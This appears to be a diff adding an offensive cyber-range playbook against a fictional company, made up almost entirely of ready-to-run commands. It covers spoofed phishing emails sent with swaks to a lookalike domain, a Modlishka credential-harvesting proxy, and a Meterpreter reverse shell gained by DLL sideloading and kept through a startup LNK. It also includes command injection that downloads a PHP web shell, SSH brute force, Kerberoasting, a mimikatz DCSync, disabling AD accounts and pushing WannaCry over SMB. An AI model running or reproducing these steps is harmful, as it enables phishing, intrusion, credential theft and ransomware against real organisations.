@@ -1,0 +1,204 @@
+echo "Dear Mohammed, <br><br> Welcome to the TechLeo Web Services team <br><br> As part of our team, you will have access to various servers necessary for your role. Below are your credentials for our web server: <br><br> <ul> <li><b>Web Server URL:</b> <a href='https://webserver.techleo.com'>webserver.techleo.com</a></li> <li><b>Username:</b>websupport</li> <li><b>Password:</b>AhArGuY5Nm7U3\!@</li> </ul> <br> For security reasons, please ensure the following: <br> <ul> <li>Change your password upon your first login.</li> <li>Do not share your login credentials with anyone.</li> <li>Always use secure connections when accessing the server.</li> </ul> <br><br> Best regards, <br> Web Services Team Lead<br> TechLeo Corporation "> /tmp/body2.txt
+
+echo "Kinh gui Mohammed, <br><br> Chao mung ban den voi doi ngu Dich vu Web cua TechLeo <br><br> La mot thanh vien cua doi ngu, ban se duoc cap quyen truy cap vao nhieu may chu can thiet cho vai tro cua minh. Duoi day la thong tin dang nhap cua ban cho may chu web cua chung toi: <br><br> <ul> <li><b>Dia chi URL cua may chu web:</b> <a href='https://webserver.techleo.com'>webserver.techleo.com</a></li> <li><b>Ten nguoi dung:</b> websupport</li> <li><b>Mat khau:</b>AhArGuY5Nm7U3\!@</li> </ul> <br> Vi ly do bao mat, vui long dam bao thuc hien cac dieu sau: <br> <ul> <li>Thay doi mat khau cua ban ngay sau lan dang nhap dau tien.</li> <li>Khong chia se thong tin dang nhap cua ban voi bat ky ai.</li> <li>Luon su dung ket noi an toan khi truy cap vao may chu.</li> </ul> <br><br> Tran trong, <br> Truong nhom Dich vu Web<br> Tap doan TechLeo" > /tmp/body2.txt
+
+-----------------------------------------------
+
+swaks --to mkhan@techleo.com --from postmaster@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body2.txt --h-Subject "Web Services Enrollment"
+
+-------------------------------------------------
+
+echo " Dear Everyone, <br> <br> We hope this message finds you well. We are excited to announce that our email infrastructure is undergoing a significant upgrade to enhance performance, security, and user experience. This upgrade will provide you with a more streamlined and efficient email service. <br> <br> <b>What This Means for You:</b> <br> <ul> <li>Improved mailbox speed and reliability.</li> <li>Enhanced security features to protect your communications.</li> <li>A smoother and more intuitive user interface.</li> </ul> <br> <b>Action Required:</b> <br> <br> To ensure a smooth transition, you may be required to authenticate to the new email server. This is a simple process that will align your account with the upgraded system. <br> <br> Please click on the following link to initiate the authentication process: <br> <a href='https://mail.techleeo.com'>Initiate Mailbox Upgrade Authentication</a> <br> <br> <b>Important:</b> The link will be active for a period of 7 days, starting from today. Please complete the authentication process within this timeframe to avoid any interruptions to your email service. <br> <br> Thanks, <br> The Infrastructure Team " > /tmp/body.txt
+
+echo "Kinh gui tat ca moi nguoi, <br> <br> Chung toi hy vong email nay den voi ban trong trang thai tot nhat. Chung toi rat vui mung thong bao rang ha tang email cua chung toi dang duoc nang cap dang ke nham cai thien hieu suat, bao mat va trai nghiem nguoi dung. Viec nang cap nay se mang den cho ban mot dich vu email muot ma va hieu qua hon. <br> <br> <b>Dieu nay co y nghia gi voi ban:</b> <br> <ul> <li>Toc do va do tin cay cua hop thu duoc cai thien.</li> <li>Cac tinh nang bao mat nang cao de bao ve thong tin lien lac cua ban.</li> <li>Giao dien nguoi dung muot ma va truc quan hon.</li> </ul> <br> <b>Hanh dong can thuc hien:</b> <br> <br> De dam bao qua trinh chuyen doi dien ra suon se, ban co the can xac thuc voi may chu email moi. Day la mot quy trinh don gian giup dong bo tai khoan cua ban voi he thong da duoc nang cap. <br> <br> Vui long nhap vao lien ket sau de bat dau qua trinh xac thuc: <br> <a href='https://mail.techleeo.com'>Khoi tao xac thuc nang cap hop thu</a> <br> <br> <b>Quan trong:</b> Lien ket nay se co hieu luc trong vong 7 ngay, bat dau tu hom nay. Vui long hoan tat qua trinh xac thuc trong khoang thoi gian nay de tranh gian doan dich vu email cua ban. <br> <br> Tran trong, <br> Doi ngu Ha tang" > /tmp/body.txt
+-------------------------------------------------------
+
+#Send the emails using swaks on 146.4.21.94 Attacker Machine 
+
+swaks --to htanaka@techleo.com --from infrasupport@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body.txt --h-Subject "Important: Mailbox Upgrade" 
+swaks --to mpatel@techleo.com --from infrasupport@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body.txt --h-Subject "Important: Mailbox Upgrade" 
+swaks --to amansoori@techleo.com --from infrasupport@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body.txt --h-Subject "Important: Mailbox Upgrade" 
+swaks --to fali@techleo.com --from infrasupport@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body.txt --h-Subject "Important: Mailbox Upgrade" 
+swaks --to mkhan@techleo.com --from infrasupport@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body.txt --h-Subject "Important: Mailbox Upgrade"
+
+------------------------------------------------------------
+
+sudo journalctl -u modlishka -f
+
+
+------------------------------------------------------------
+
+#Let us access Firefox and log in to mkhan’s inbox using the credentials Username: mkhan@techleo.com Password: Baseball123! on attacker machine.
+
+------------------------------------------------------------
+
+#Access the webserver using the ssh credentials shown above from 108.61.186.55 Attacker machine Host: webserver.techleo.com Username: websupport Password: AhArGuY5Nm7U3!@
+
+ssh websupport@webserver.techleo.com
+AhArGuY5Nm7U3!@
+
+------------------------------------------------------------
+
+#DLL Side Loading We will sideload VSCode to get a meterpreter shell and persistence on the webserver. Begin by navigating to this folder: 
+
+cd "C:\Users\websupport\AppData\Local\Programs\Microsoft VS Code\"
+
+------------------------------------------------------------
+
+#Create a python server to host the dlls to be sideloaded on 146.4.21.94 Attacker Machine: 
+
+cd /root/Desktop/Artifacts 
+python3 -m http.server
+
+------------------------------------------------------------
+
+#Download the files from the ssh session which you had done on 108.61.186.55 Attacker Machine:
+
+curl -o cscaip.dll http://146.4.21.94:8000/cscaip.dll 
+curl -o cscapi.dll http://146.4.21.94:8000/cscapi.dll
+
+------------------------------------------------------------
+
+dir
+
+--------------------------------------------------------------
+
+#Head over to the Kali attacker machine with the 108.61.186.55 IP and start a Metasploit listener 
+
+msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 108.61.186.55; set LPORT 443; set EXITFUNC thread; set EXITONSESSION false; exploit -j" 2>&1
+
+--------------------------------------------------------------
+
+Code.exe
+
+--------------------------------------------------------------
+
+sessions 1
+shell
+powershell
+
+--------------------------------------------------------------
+
+iwr -useb http://146.4.21.94:8000/VisualStudioCode.lnk -OutFile "C:\Users\websupport\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VisualStudioCode.lnk"
+
+--------------------------------------------------------------
+
+(Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.125:3000/ping?ip=8.8.8.8%3Bid" -Method "POST").Content
+
+
+(Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.125:3000/ping?ip=8.8.8.8%3Bcat+%2Fetc%2Fpasswd" -Method "POST").Content
+
+
+Invoke-WebRequest -Uri 'http://10.10.10.125:3000/ping?ip=8.8.8.8;wget+http://146.4.21.94:8000/wbs.php+- O+/var/www/html/wbs.php' -Method POST
+
+(Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.125:80/wbs.php?cmd=ls").Content
+
+--------------------------------------------------------------
+
+
+
+
+
+--------------------------------------------------------------
+
+exit
+exit
+background
+
+--------------------------------------------------------------
+
+use auxiliary/scanner/ssh/ssh_login 
+set RHOSTS 10.10.10.125 
+set USERNAME lkhalid 
+set PASSWORD Password123! 
+run
+
+--------------------------------------------------------------
+
+sessions 2
+
+--------------------------------------------------------------
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+--------------------------------------------------------------
+
+cd /opt 
+echo 'Password123!' | sudo git clone https://github.com/fortra/impacket.git 
+cd impacket 
+sudo pip3 install . 
+sudo pip install bloodhound
+
+--------------------------------------------------------------
+
+sudo cp /home/lkhalid/.local/bin/bloodhound-python /usr/local/bin/bpn
+bpn -c all -d techleo.com -u lkhalid -p 'Password123!' -ns 10.10.10.50 -gc techleo.com -v
+
+--------------------------------------------------------------
+
+sudo ntpdate -u 10.10.10.50
+
+--------------------------------------------------------------
+
+sudo GetUserSPNs.py techleo.com/lkhalid:'Password123!' -dc-ip 10.10.10.50 -request
+
+--------------------------------------------------------------
+
+sudo systemctl stop lb.service 
+sudo systemctl disable lb.service
+
+--------------------------------------------------------------
+
+echo " Greetings, <br> Attached is a CV in ISO format (file: [Roshan_CV.iso]) of a potential candidate. <br> Please let me know if you need it in a different format or have any issues accessing the file. <br> <br> Best regards, <br> Mohammad Khan <br> mkhan@techleo.com " > body.txt
+
+echo "Xin chao, <br> File dinh kem la CV dinh dang ISO (file: [Roshan_CV.iso]) cua mot ung vien tiem nang. <br> Vui long cho toi biet neu ban can dinh dang khac hoac gap bat ky van de nao khi truy cap file. <br> <br> Tran trong, <br> Mohammad Khan <br> mkhan@techleo.com" > body.txt
+
+--------------------------------------------------------------
+
+swaks --to aabdullah@techleo.com --from mkhan@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @body.txt --h-Subject "CV Submission - Roshan" --attach Roshan_CV.iso 
+
+swaks --to afarsi@techleo.com --from roshan@yahoo.com --server 172.16.4.55 --ehlo techleo.com --attachtype text/html --attach-body @body.txt --h-Subject "CV Submission - Roshan" --attach Roshan_CV.iso
+
+--------------------------------------------------------------
+
+msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 108.61.186.55; set LPORT 443; set EXITFUNC thread; set EXITONSESSION false; exploit -j" 2>&1
+
+--------------------------------------------------------------
+
+sessions 2
+
+getuid
+sysinfo
+
+--------------------------------------------------------------
+
+upload /home/rangeadmin/Desktop/Artifacts/mimikatz.exe C:\\Users\\Public 
+shell 
+powershell 
+cd C:\Users\Public
+
+--------------------------------------------------------------
+
+.\mimikatz.exe 
+lsadump::dcsync /domain:techleo.com /user:aabdullah 
+lsadump::dcsync /domain:techleo.com /user:afarsi 
+exit
+
+--------------------------------------------------------------
+
+Invoke-Command -computername dc01 -scriptblock {disable-adaccount -identity "Administrator" } 
+Invoke-Command -computername dc01 -scriptblock {disable-adaccount -identity " afarsi" }
+
+--------------------------------------------------------------
+
+crackmapexec smb 192.168.210.81 192.168.210.82 192.168.210.83 -u 'aabdullah' -p 'Password_7' --put-file WannaCry.exe '\\Users\\Public\dropbox.exe'
+
+--------------------------------------------------------------
+
+crackmapexec smb 192.168.210.81 192.168.210.82 192.168.210.83 -u 'aabdullah' -p 'Password_7' --put-file WannaCry.exe '\\Users\\Public\dropbox.exe'
+
+
+--------------------------------------------------------------
+
+
+Ctr+c 
